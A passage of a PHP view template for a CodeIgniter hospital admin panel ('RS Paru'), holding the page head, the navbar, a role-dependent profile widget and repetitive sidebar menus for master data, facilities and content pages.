<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <?php
    $ambil = $this->M_template->tampilinfo();
    foreach ($ambil as $am) {      ?>

        <title><?php echo $am->nama_rs ?></title>

    <?php  } ?>

    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/admin/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/admin/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/admin/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->

    <!--Themify Icons [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/admin/plugins/themify-icons/themify-icons.min.css" rel="stylesheet">

    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url(); ?>assets/admin/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url(); ?>assets/admin/plugins/pace/pace.min.js"></script>


    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/admin/css/demo/nifty-demo.min.css" rel="stylesheet">

    <!--Summernote [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/admin/plugins/summernote/summernote.min.css" rel="stylesheet">

    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/admin/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url(); ?>assets/admin/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/admin/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->

    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url(); ?>assets/admin/css/demo/nifty-demo.min.css" rel="stylesheet">

    <!--Morris.js [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/admin/plugins/morris-js/morris.min.css" rel="stylesheet">

    <!--Font Awesome [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/admin/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet">

    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url(); ?>assets/admin/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url(); ?>assets/admin/plugins/pace/pace.min.js"></script>
    <link href="<?php echo base_url(); ?>assets/admin/css/demo/nifty-demo.min.css" rel="stylesheet">

    <!--Summernote [ OPTIONAL ]-->
    <link href="<?php echo base_url(); ?>assets/admin/plugins/summernote/summernote.min.css" rel="stylesheet">

</head>
<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->

<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">

        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">

                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <!-- <img src="" alt="Nifty Logo" class="brand-icon"> -->
                        <div class="brand-title">
                            <span class="brand-text">RS Paru</span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->


                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">

                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Navigation toogle button-->



                    </ul>
                    <ul class="nav navbar-top-links">

                        <!--Notification dropdown-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="dropdown">
                            <a href="#" data-toggle="dropdown" class="dropdown-toggle">
                                <i class="demo-pli-bell"></i>
                                <span class=""></span>
                            </a>

                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End notifications dropdown-->



                        <!--User dropdown-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li id="dropdown-user" class="dropdown">
                            <a href="#" data-toggle="dropdown" class="dropdown-toggle text-right">
                                <span class="ic-user pull-right">
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <!--You can use an image instead of an icon.-->
                                    <!--<img class="img-circle img-user media-object" src="img/profile-photos/1.png" alt="Profile Picture">-->
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <i class="demo-pli-male"></i>
                                </span>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--You can also display a user name in the navbar.-->
                                <!--<div class="username hidden-xs">Aaron Chavez</div>-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            </a>

                            <div class="dropdown-menu dropdown-menu-sm dropdown-menu-right panel-default">
                                <ul class="head-list">
                                    <li>
                                        <a href="<?php echo base_url().'Beranda/profile' ?>"><i class="demo-pli-male icon-lg icon-fw"></i> Profile</a>
                                    </li>
                                    <li>
                                        <a href="<?php echo site_url('Login/logoutApp') ?>"><i class="demo-pli-unlock icon-lg icon-fw"></i> Logout</a>
                                    </li>
                                </ul>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End user dropdown-->



                        <li>
                            <a href="#" class="aside-toggle">
                                <i class="demo-pli-dot-vertical"></i>
                            </a>
                        </li>
                    </ul>
                </div>
                <!--================================-->
                <!--End Navbar Dropdown-->

            </div>
        </header>
        <!--===================================================-->
        <!--END NAVBAR-->

        <?php
        $this->load->view($namamodule . '/' . $namafileview);
        ?>
        <!--MAIN NAVIGATION-->
        <!--===================================================-->
        <nav id="mainnav-container">
            <div id="mainnav">

                <!--Menu-->
                <!--================================-->
                <div id="mainnav-menu-wrap">
                    <div class="nano">
                        <div class="nano-content">

                          <?php
                          $ambil = $this->M_template->ambil($id);
                          foreach ($ambil as $am) {
                             $status = $am->status_user;  ?>


                             <!--Profile Widget-->
                             <!--================================-->
                             <div id="mainnav-profile" class="mainnav-profile">
                                <div class="profile-wrap text-center">
                                    <div class="pad-btm">
                                        <img class="img-circle img-md" src="<?php echo base_url();?>assets/admin/img/galeri/<?php echo $am->foto ?>" alt="Profile Picture">
                                    </div>
                                    <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
                                        <p class="mnp-name"><?php echo $am->nama?></p>
                                    <?php if ($status == 1 ) { ?>
                                      <span class="mnp-desc">Administrator</span>
                                    <?php } elseif  ($status == 2 ) { ?> 
                                    <span class="mnp-desc">Rekam Medik</span>
                                    <?php } elseif ($status == 3 ) { ?>
                                        <span class="mnp-desc">Humas</span>
                                    <?php } elseif ($status == 4 ) { ?>
                                        <span class="mnp-desc">Perencanaan</span>
                                    <?php } elseif ($status == 5 ) { ?>
                                        <span class="mnp-desc">Litbang</span>
                                    <?php } ?>   
                                </a>
                            </div>
                        </div>
                    <?php } ?>

                    <?php
                    $ambil = $this->M_template->ambil($id);
                    foreach ($ambil as $am) {
                     $status = $am->status_user;  ?>

                     <?php if ($status == 1 ){ ?>
                         <ul id="mainnav-menu" class="list-group">
                            <!--Category name-->
                            <li class="list-header">Menu Utama</li>

                            <?php if($this->uri->segment('1') == 'Beranda'){ ?>
                                <!--Menu list item-->
                                <li class="active-sub">
                                    <a href="<?php echo base_url('Beranda');?>">
                                        <!-- <i class="demo-pli-home"></i> -->
                                        <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
                                        <span class="menu-title">Beranda</span>
                                    </a>
                                </li>
                            <?php }else{ ?>
                               <!--Menu list item-->
                               <li>
                                <a href="<?php echo base_url('Beranda');?>">
                                        <img src="<?php echo base_url('assets/admin/img/icon/beranda.png')?>" alt="" style="width:30px; height:30px ">
                                    <!-- <i class="demo-pli-home"></i> -->
                                    <span class="menu-title">Beranda</span>
                                </a>
                            </li>
                        <?php } ?>

                        <?php if ($info == 0){ ?>
                         <?php if($this->uri->segment('1') == 'Profil_rs'){ ?>
                            <!--Menu list item-->
                            <li class="active-sub">
                                <a href="#">
                                    <!-- <i class="demo-pli-boot-2"></i> -->
                                    <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                                    <span class="menu-title">DATA MASTER</span>
                                    <i class="arrow"></i>
                                </a>

                                <!--Submenu-->
                                <ul class="collapse">
                                    <li class="active-link"><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                                    <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                                </ul>
                            </li>

                            <!--Menu list item-->
                        <?php }elseif($this->uri->segment('1') == 'Sejarah') { ?>
                          <!--Menu list item-->
                          <li class="active-sub">
                            <a 
                            href="#">
                            <!-- <i class="demo-pli-boot-2"></i> -->
                            <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                            <span class="menu-title">DATA MASTER</span>
                            <i class="arrow"></i>
                        </a>

                        <!--Submenu-->
                        <ul class="collapse">
                            <li ><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                            <li class="active-link" ><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                            <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                            <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                            <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                        </ul>
                    </li>
                    <!--Menu list item-->
                    <?php }elseif($this->uri->segment('1') == 'Direksi') { ?>
                          <!--Menu list item-->
                          <li class="active-sub">
                            <a 
                            href="#">
                            <!-- <i class="demo-pli-boot-2"></i> -->
                            <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                            <span class="menu-title">DATA MASTER</span>
                            <i class="arrow"></i>
                        </a>

                        <!--Submenu-->
                        <ul class="collapse">
                            <li ><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                            <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                            <li class="active-link"><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                            <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                            <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                        </ul>
                    </li>
                    <!--Menu list item-->
                <?php }elseif($this->uri->segment('1') == 'Visi_misi') {?>
                  <!--Menu list item-->
                  <li class="active-sub">
                    <a href="#">
                        <!-- <i class="demo-pli-boot-2"></i> -->
                        <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                        <span class="menu-title">DATA MASTER</span>
                        <i class="arrow"></i>
                    </a>

                    <!--Submenu-->
                    <ul class="collapse">
                        <li ><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                        <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                        <li class="active-link"><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                        <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                    </ul>
                </li>
                <!--Menu list item-->
                <?php }elseif($this->uri->segment('1') == 'Stuktur_organisasi') {?>
                  <!--Menu list item-->
                  <li class="active-sub">
                    <a href="#">
                        <!-- <i class="demo-pli-boot-2"></i> -->
                        <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                        <span class="menu-title">DATA MASTER</span>
                        <i class="arrow"></i>
                    </a>

                    <!--Submenu-->
                    <ul class="collapse">
                        <li ><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                        <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                        <li ><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                        <li class="active-link"><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                    </ul>
                </li>
                <!--Menu list item-->
            <?php }else{ ?>
               <!--Menu list item-->
               <li>
                <a href="#">
                    <!-- <i class="demo-pli-boot-2"></i> -->
                    <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                    <span class="menu-title">Profile RS</span>
                    <i class="arrow"></i>
                </a>

                <!--Submenu-->
                <ul class="collapse">
                    <li><a href="<?php echo base_url('Profil_rs');?>">PROFIL RS</a></li>
                    <li><a href="<?php echo base_url('Sejarah');?>">Sejarah RS</a></li>
                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                </ul>
            </li>
            <!--Menu list item-->
        <?php } ?>
    <?php }else{ ?>
        <?php if($this->uri->segment('1') == 'Profil_rs/next'){ ?>
            <!--Menu list item-->
            <li class="active-sub">
                <a href="#">
                    <!-- <i class="demo-pli-boot-2"></i> -->
                    <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                    <span class="menu-title">DATA MASTER</span>
                    <i class="arrow"></i>
                </a>

                <!--Submenu-->
                <ul class="collapse">
                    <li class="active-link"><a href="<?php echo base_url('Profil_rs/next');?>">Profil RS</a></li>
                    <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
                </ul>
            </li>
            <!--Menu list item-->
        <?php }elseif($this->uri->segment('1') == 'Sejarah') { ?>
          <!--Menu list item-->
          <li class="active-sub">
            <a href="#">
                <!-- <i class="demo-pli-boot-2"></i> -->
                <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                <span class="menu-title">DATA MASTER</span>
                <i class="arrow"></i>
            </a>

            <!--Submenu-->
            <ul class="collapse">
                    <li><a href="<?php echo base_url('Profil_rs/next');?>">Profil RS</a></li>
                    <li class="active-link" ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
                    <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
            </ul>
        </li>
        <!--Menu list item-->
        <?php }elseif($this->uri->segment('1') == 'Direksi') { ?>
          <!--Menu list item-->
          <li class="active-sub">
            <a href="#">
                <!-- <i class="demo-pli-boot-2"></i> -->
                <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
                <span class="menu-title">DATA MASTER</span>
                <i class="arrow"></i>
            </a>

            <!--Submenu-->
            <ul class="collapse">
                    <li><a href="<?php echo base_url('Profil_rs/next');?>">Profil RS</a></li>
                    <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
                    <li  class="active-link"><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
                    <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
                    <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
            </ul>
        </li>
        <!--Menu list item-->
    <?php }elseif($this->uri->segment('1') == 'Visi_misi') {?>
      <!--Menu list item-->
      <li class="active-sub">
        <a href="#">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">DATA MASTER</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Profil_rs/next');?>">Profil RS</a></li>
            <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
            <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
            <li class="active-link"><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
            <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php }elseif ($this->uri->segment('1') == 'Struktur_organisasi'){ ?>
   <!--Menu list item-->
   <li class="active-sub">
    <a href="#">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
        <span class="menu-title">DATA MASTER</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li><a href="<?php echo base_url('Profil_rs/next');?>">Profil RS</a></li>
        <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
        <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
        <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
        <li  class="active-link"><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
    </ul>
</li>
<!--Menu list item-->
<?php }else{ ?>
    <!--Menu list item-->
    <li>
        <a href="#">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <img src="<?php echo base_url('assets/admin/img/icon/data.png')?>" alt="" style="width:30px; height:30px ">
            <span class="menu-title">DATA MASTER</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Profil_rs/next');?>">Profil RS</a></li>
        <li ><a href="<?php echo base_url('Sejarah');?>">Sejarah</a></li>
        <li ><a href="<?php echo base_url('Direksi');?>">Direksi</a></li>
        <li><a href="<?php echo base_url('Visi_misi');?>">Visi dan Misi</a></li>
        <li><a href="<?php echo base_url('Stuktur_organisasi');?>">Struktur Organisasi</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php } } ?>


<?php if($this->uri->segment('1') == 'Pelayanan'){ ?>
  <!--Menu list item-->
  <li class="active-sub">
    <a href="#">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
        <span class="menu-title">SARANA DAN PRASARANA</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li  class="active-link"><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li ><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
        </ul>
</li>
<!--Menu list item-->
<?php }elseif($this->uri->segment('1') == 'Layanan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">SARANA DAN PRASARANA</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li class="active-link"><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li ><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php }elseif($this->uri->segment('1') == 'Ruangan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">SARANA DAN PRASARANA</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li ><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li class="active-link"><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li ><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
        </ul>
    </li>

    <?php }elseif($this->uri->segment('1') == 'Poli'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">SARANA DAN PRASARANA</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li ><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li class="active-link"><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
    </ul>
    </li>
    <?php }elseif($this->uri->segment('1') == 'Dokter'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">SARANA DAN PRASARANA</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li ><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li  class="active-link"><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
    </ul>
    </li>

<?PHP }else{?>
   <!--Menu list item-->
   <li>
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/datainfo.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <span class="menu-title">SARANA DAN PRASARANA</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li><a href="<?php echo base_url('Pelayanan');?>">Pelayanan Unggulan</a></li>
        <li ><a href="<?php echo base_url('Layanan');?>">Layanan</a></li>
        <li ><a href="<?php echo base_url('Ruangan');?>">Ruangan</a></li>
        <li><a href="<?php echo base_url('Poli');?>">Poli</a></li>
        <li><a href="<?php echo base_url('Dokter');?>">Dokter</a></li>
    </ul>
</li>
<!--Menu list item-->
<?php } ?>


<?php if($this->uri->segment('1') == 'Berita'){ ?>
  <!--Menu list item-->
  <li class="active-sub">
    <a href="#">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
        <span class="menu-title">Konten</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li class="active-link"><a href="<?php echo base_url('Berita');?>">Berita</a></li>
        <li><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
        <li><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
        <li><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
        <li><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
        <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
    </ul>
</li>
<?php }elseif($this->uri->segment('1') == 'Pengumuman'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">Konten</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
            <li  class="active-link"><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
            <li><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
            <li><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
        <li><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
            <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php }elseif($this->uri->segment('1') == 'Kegiatan'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">Konten</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
            <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
            <li class="active-link"><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
            <li><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
            <li><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
            <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
        </ul>
    </li>
    <!--Menu list item-->
    <?php }elseif($this->uri->segment('1') == 'Artikel'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">Konten</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
            <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
            <li><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
            <li  class="active-link"><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
            <li><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
            <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
        </ul>
    </li>
    <!--Menu list item-->
    <?php }elseif($this->uri->segment('1') == 'Promosi'){ ?>
    <!--Menu list item-->
    <li class="active-sub">
        <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
            <!-- <i class="demo-pli-boot-2"></i> -->
            <span class="menu-title">Konten</span>
            <i class="arrow"></i>
        </a>

        <!--Submenu-->
        <ul class="collapse">
            <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
            <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
            <li><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
            <li ><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
            <li class="active-link"><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
            <li><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
        </ul>
    </li>
    <!--Menu list item-->
<?php }elseif($this->uri->segment('1') == 'Dokumentasi'){ ?>
   <!--Menu list item-->
   <li class="active-sub">
    <a href="#">
        <img src="<?php echo base_url('assets/admin/img/icon/konten.png')?>" alt="" style="width:30px; height:30px ">
        <!-- <i class="demo-pli-boot-2"></i> -->
        <span class="menu-title">Konten</span>
        <i class="arrow"></i>
    </a>

    <!--Submenu-->
    <ul class="collapse">
        <li ><a href="<?php echo base_url('Berita');?>">Berita</a></li>
        <li ><a href="<?php echo base_url('Pengumuman');?>">Pengumuman</a></li>
        <li ><a href="<?php echo base_url('Kegiatan');?>">Kegiatan</a></li>
        <li ><a href="<?php echo base_url('Artikel');?>">Artikel</a></li>
        <li ><a href="<?php echo base_url('Promosi');?>">Promosi</a></li>
        <li class="active-link"><a href="<?php echo base_url('Dokumentasi');?>">Gallery</a></li>
    </ul>
</li>
<!--Menu list item-->
